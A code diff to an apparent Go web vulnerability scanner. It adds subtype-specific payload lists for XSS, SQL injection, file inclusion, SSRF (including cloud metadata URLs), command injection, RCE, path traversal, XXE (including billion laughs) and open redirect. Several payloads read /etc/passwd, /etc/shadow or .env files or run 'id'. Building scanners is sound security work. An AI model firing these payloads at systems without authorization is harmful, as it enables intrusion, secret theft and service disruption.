@@ -242,6 +242,10 @@ func (sc *ScannerCoordinator) scannerMode(scannerType ScannerType) string {
 	return strings.ToLower(strings.TrimSpace(sc.scannerOption("mode_"+string(scannerType), "balanced")))
 }
 
+func (sc *ScannerCoordinator) scannerSubtype(scannerType ScannerType, defaultSubtype string) string {
+	return strings.ToLower(strings.TrimSpace(sc.scannerOption("subtype_"+string(scannerType), defaultSubtype)))
+}
+
 func (sc *ScannerCoordinator) modeIntensity(scannerType ScannerType) int {
 	intensity := sc.config.Intensity
 	switch sc.scannerMode(scannerType) {
@@ -252,6 +256,14 @@ func (sc *ScannerCoordinator) modeIntensity(scannerType ScannerType) int {
 	case "deep":
 		intensity += 2
 	}
+
+	switch sc.scannerSubtype(scannerType, "") {
+	case "full", "state_change", "internal_services", "stacked", "deserialization":
+		intensity++
+	case "strict_token", "browser_policy":
+		intensity--
+	}
+
 	if intensity < 1 {
 		intensity = 1
 	}
@@ -275,26 +287,110 @@ func (sc *ScannerCoordinator) mergePayloads(scannerType ScannerType, legacyKey s
 	}
 
 	mode := sc.scannerMode(scannerType)
+	subtype := sc.scannerSubtype(scannerType, "")
 	switch scannerType {
 	case ScannerXSS:
 		if mode == "aggressive" || mode == "deep" {
 			combined = append(combined, "<svg><script>alert(1337)</script></svg>", "<img src=x onerror=confirm(document.domain)>")
 		}
+		switch subtype {
+		case "reflected":
+			combined = append(combined, "\"><script>alert(1)</script>")
+		case "stored":
+			combined = append(combined, "<script>fetch('/x')</script>", "<img src=x onerror=fetch('/beacon')>")
+		case "dom":
+			combined = append(combined, "#<img src=x onerror=alert(1)>", "javascript:alert(document.domain)")
+		case "full":
+			combined = append(combined, "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>")
+		}
 	case ScannerSQL:
 		if mode == "aggressive" || mode == "deep" {
 			combined = append(combined, "'||(SELECT pg_sleep(5))--", "' OR SLEEP(5)--")
+		}
+		switch subtype {
+		case "error_based":
+			combined = append(combined, "'", "\"", "' AND extractvalue(1,concat(0x7e,version(),0x7e))--")
+		case "union_based":
+			combined = append(combined, "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--")
+		case "time_based":
+			combined = append(combined, "' AND IF(1=1,SLEEP(5),0)--", "';WAITFOR DELAY '0:0:5'--")
+		case "stacked":
+			combined = append(combined, "';SELECT pg_sleep(5)--", "';SELECT SLEEP(5)--")
 		}
 	case ScannerLFI:
 		if mode == "aggressive" || mode == "deep" {
 			combined = append(combined, "../../../../proc/self/environ", "../../../../etc/shadow")
 		}
+		switch subtype {
+		case "path_traversal":
+			combined = append(combined, "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini")
+		case "wrapper_abuse":
+			combined = append(combined, "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd")
+		case "sensitive_reads":
+			combined = append(combined, "../../../../var/www/.env", "../../../../proc/version")
+		}
 	case ScannerSSRF:
 		if mode == "aggressive" || mode == "deep" {
 			combined = append(combined, "http://127.0.0.1:2375/version", "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
 		}
+		switch subtype {
+		case "metadata":
+			combined = append(combined, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/")
+		case "localhost":
+			combined = append(combined, "http://127.0.0.1:22", "http://localhost:8080/actuator")
+		case "internal_services":
+			combined = append(combined, "http://10.0.0.1:2375/version", "gopher://127.0.0.1:6379/_INFO")
+		}
 	case ScannerCommandInjection, ScannerRCE:
 		if mode == "aggressive" || mode == "deep" {
 			combined = append(combined, ";cat /etc/passwd", "$(id)")
+		}
+		if scannerType == ScannerCommandInjection {
+			switch subtype {
+			case "shell_metachar":
+				combined = append(combined, ";id", "&& whoami")
+			case "blind_timing":
+				combined = append(combined, ";sleep 5", "&& ping -c 5 127.0.0.1")
+			case "oob_dns":
+				combined = append(combined, ";nslookup canary.invalid", ";dig canary.invalid")
+			}
+		}
+		if scannerType == ScannerRCE {
+			switch subtype {
+			case "template_injection":
+				combined = append(combined, "{{7*7}}", "${7*7}")
+			case "deserialization":
+				combined = append(combined, "O:8:\"Exploit\":1:{s:4:\"test\";s:2:\"id\";}", "{\"@type\":\"java.lang.AutoCloseable\"}")
+			case "runtime_eval":
+				combined = append(combined, "system('id')", "Runtime.getRuntime().exec('id')")
+			}
+		}
+	case ScannerDirectoryTraversal:
+		switch subtype {
+		case "dotdot_slash":
+			combined = append(combined, "../../../../etc/passwd")
+		case "encoded_bypass":
+			combined = append(combined, "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd")
+		case "windows_paths":
+			combined = append(combined, "..\\..\\..\\windows\\win.ini", "..%5c..%5cwindows%5cwin.ini")
+		}
+	case ScannerXXE:
+		switch subtype {
+		case "file_disclosure":
+			combined = append(combined, "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>")
+		case "ssrf_entities":
+			combined = append(combined, "<!DOCTYPE x [<!ENTITY e SYSTEM \"http://127.0.0.1:8080\">]><x>&e;</x>")
+		case "billion_laughs":
+			combined = append(combined, "<!DOCTYPE lolz [<!ENTITY a \"lol\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">]><lolz>&b;</lolz>")
+		}
+	case ScannerOpenRedirect:
+		switch subtype {
+		case "query_redirect":
+			combined = append(combined, "https://evil.example", "//evil.example")
+		case "path_redirect":
+			combined = append(combined, "/\\evil.example", "/%2f%2fevil.example")
+		case "double_encoding":
+			combined = append(combined, "https:%252f%252fevil.example", "%2F%2Fevil.example")
 		}
 	}
 
@@ -320,8 +416,10 @@ func (sc *ScannerCoordinator) mergePayloads(scannerType ScannerType, legacyKey s
 // XSS Scanner
 func (sc *ScannerCoordinator) runXSSScanner() error {
 	intensity := sc.modeIntensity(ScannerXSS)
+	subtype := sc.scannerSubtype(ScannerXSS, "reflected")
+	useChrome := subtype == "dom" || subtype == "full"
 	scanner, err := scanners.NewScanner(sc.config.Target, sc.config.Workers, sc.config.MaxPages,
-		sc.config.MaxDepth, intensity, false, sc.config.Throttle,
+		sc.config.MaxDepth, intensity, useChrome, sc.config.Throttle,
 		sc.mergePayloads(ScannerXSS, "xss"))
 	if err != nil {
 		return err
@@ -334,13 +432,20 @@ func (sc *ScannerCoordinator) runXSSScanner() error {
 		sc.addFinding(ConvertXSSFinding(f))
 	}
 
-	fmt.Printf("[✓] XSS Scanner: Found %d vulnerabilities\n", len(scanner.Findings))
+	fmt.Printf("[✓] XSS Scanner (%s): Found %d vulnerabilities\n", subtype, len(scanner.Findings))
 	return nil
 }
 
 // CSRF Scanner
 func (sc *ScannerCoordinator) runCSRFScanner() error {
+	subtype := sc.scannerSubtype(ScannerCSRF, "post_forms")
 	intensity := sc.modeIntensity(ScannerCSRF)
+	if subtype == "state_change" {
+		intensity++
+		if intensity > 5 {
+			intensity = 5
+		}
+	}
 	scanner, err := scanners.NewCSRFScanner(sc.config.Target, sc.config.Workers,
 		sc.config.MaxPages, sc.config.MaxDepth, sc.config.Throttle, intensity, sc.config.TargetedCVEs)
 	if err != nil {
@@ -354,7 +459,7 @@ func (sc *ScannerCoordinator) runCSRFScanner() error {
 		sc.addFinding(ConvertCSRFFinding(f))
 	}
 
-	fmt.Printf("[✓] CSRF Scanner: Found %d vulnerabilities\n", len(scanner.Findings))
+	fmt.Printf("[✓] CSRF Scanner (%s): Found %d vulnerabilities\n", subtype, len(scanner.Findings))
 	return nil
 }
 
